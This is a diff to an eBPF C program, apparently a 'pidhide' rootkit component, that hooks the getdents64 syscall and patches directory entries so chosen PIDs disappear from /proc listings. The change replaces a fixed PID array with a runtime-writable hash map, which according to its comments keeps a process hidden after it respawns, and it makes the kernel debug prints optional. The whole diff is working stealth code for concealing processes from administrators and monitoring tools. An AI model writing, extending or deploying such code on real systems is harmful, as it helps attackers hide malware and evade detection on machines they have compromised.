@@ -51,63 +51,36 @@ struct {
 // Optional Target Parent PID
 const volatile int target_ppid = 0;
 
-// Maximum number of PIDs we can hide
-#define MAX_PIDS_TO_HIDE 16
 #define MAX_PID_LEN 10
 
-// Array of PIDs to hide (as strings, since they become folder names in /proc/)
-const volatile int num_pids_to_hide = 0;
-const volatile char pids_to_hide[MAX_PIDS_TO_HIDE][MAX_PID_LEN];
-const volatile int pid_lens[MAX_PIDS_TO_HIDE];
+// PIDs to hide, keyed by their fixed-size, zero-padded string form (the
+// same bytes handle_getdents_exit() reads from d_name) - a writable hash
+// map instead of load-time rodata, so userspace can add/remove entries
+// while running (see pidhide.c's periodic re-resolution of -n NAME
+// entries, which need this to survive a process respawning with a new
+// PID). Explicit -p PID entries live here too, just never refreshed.
+//
+// IMPORTANT: hash map keys are compared byte-for-byte across the entire
+// fixed key size, not just the meaningful prefix - unlike the old
+// per-entry length-bounded comparison this replaces, every byte of the
+// key matters here. bpf_probe_read_user_str() does NOT zero-pad bytes
+// after the copied string (unlike e.g. strncpy) - the destination buffer
+// must be explicitly zeroed first, or trailing stack garbage would make
+// the same PID hash to different keys across calls and silently never
+// match. See the matching memset on the userspace insert side in
+// pidhide.c - both sides must use the exact same convention.
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 64);
+    __type(key, char[MAX_PID_LEN]);
+    __type(value, __u8);
+} pids_to_hide_map SEC(".maps");
 
-// Helper to compare a single PID string against filename
-// Manual comparison since we can't use strcmp in BPF
-static __always_inline int cmp_pid(char *filename, int pid_idx) {
-    int len = pid_lens[pid_idx];
-    if (len <= 0 || len > MAX_PID_LEN) {
-        return 0;
-    }
-    
-    // Manual unroll for MAX_PID_LEN (10 chars max for PID string)
-    // PID can be at most 7 digits (4194304 max on Linux) + null = 8, but we allow 10
-    if (len > 0 && filename[0] != pids_to_hide[pid_idx][0]) return 0;
-    if (len > 1 && filename[1] != pids_to_hide[pid_idx][1]) return 0;
-    if (len > 2 && filename[2] != pids_to_hide[pid_idx][2]) return 0;
-    if (len > 3 && filename[3] != pids_to_hide[pid_idx][3]) return 0;
-    if (len > 4 && filename[4] != pids_to_hide[pid_idx][4]) return 0;
-    if (len > 5 && filename[5] != pids_to_hide[pid_idx][5]) return 0;
-    if (len > 6 && filename[6] != pids_to_hide[pid_idx][6]) return 0;
-    if (len > 7 && filename[7] != pids_to_hide[pid_idx][7]) return 0;
-    if (len > 8 && filename[8] != pids_to_hide[pid_idx][8]) return 0;
-    if (len > 9 && filename[9] != pids_to_hide[pid_idx][9]) return 0;
-    
-    return 1;
-}
-
-// Helper to check if filename matches any PID we want to hide
-// Returns 1 if match found, 0 otherwise
-static __always_inline int check_pid_match(char *filename) {
-    // Manual unroll for MAX_PIDS_TO_HIDE (16)
-    // Each check is independent, verifier should be happy
-    if (num_pids_to_hide > 0  && cmp_pid(filename, 0))  return 1;
-    if (num_pids_to_hide > 1  && cmp_pid(filename, 1))  return 1;
-    if (num_pids_to_hide > 2  && cmp_pid(filename, 2))  return 1;
-    if (num_pids_to_hide > 3  && cmp_pid(filename, 3))  return 1;
-    if (num_pids_to_hide > 4  && cmp_pid(filename, 4))  return 1;
-    if (num_pids_to_hide > 5  && cmp_pid(filename, 5))  return 1;
-    if (num_pids_to_hide > 6  && cmp_pid(filename, 6))  return 1;
-    if (num_pids_to_hide > 7  && cmp_pid(filename, 7))  return 1;
-    if (num_pids_to_hide > 8  && cmp_pid(filename, 8))  return 1;
-    if (num_pids_to_hide > 9  && cmp_pid(filename, 9))  return 1;
-    if (num_pids_to_hide > 10 && cmp_pid(filename, 10)) return 1;
-    if (num_pids_to_hide > 11 && cmp_pid(filename, 11)) return 1;
-    if (num_pids_to_hide > 12 && cmp_pid(filename, 12)) return 1;
-    if (num_pids_to_hide > 13 && cmp_pid(filename, 13)) return 1;
-    if (num_pids_to_hide > 14 && cmp_pid(filename, 14)) return 1;
-    if (num_pids_to_hide > 15 && cmp_pid(filename, 15)) return 1;
-    
-    return 0;
-}
+#if NOGITSUNE_DEBUG
+#define log_bpf(fmt, ...) bpf_printk(fmt, ##__VA_ARGS__)
+#else
+#define log_bpf(fmt, ...)
+#endif
 
 SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
@@ -169,10 +142,16 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
         }
         dirp = (struct linux_dirent64 *)(buff_addr + bpos);
         bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
+        /* Explicit zero-fill before the read: bpf_probe_read_user_str()
+         * does not pad bytes after the copied string, so without this the
+         * trailing bytes would be leftover stack garbage from a previous,
+         * possibly-longer filename - making the same PID hash to a
+         * different key on different iterations and never match. */
+        __builtin_memset(&filename, 0, sizeof(filename));
         bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);
 
         // Check if this filename matches any PID we want to hide
-        if (check_pid_match(filename)) {
+        if (bpf_map_lookup_elem(&pids_to_hide_map, filename)) {
             // Found a matching PID folder
             // Save position AFTER this entry so we continue from there after patching
             unsigned int next_pos = bpos + d_reclen;
@@ -225,9 +204,9 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
     // Debug print
     char filename[MAX_PID_LEN];
     bpf_probe_read_user_str(&filename, sizeof(filename), dirp_previous->d_name);
-    bpf_printk("[PID_HIDE] previous entry: %s\n", filename);
+    log_bpf("[PID_HIDE] previous entry: %s\n", filename);
     bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);
-    bpf_printk("[PID_HIDE] hiding entry: %s\n", filename);
+    log_bpf("[PID_HIDE] hiding entry: %s\n", filename);
 
     // Overwrite d_reclen to skip over the hidden entry
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
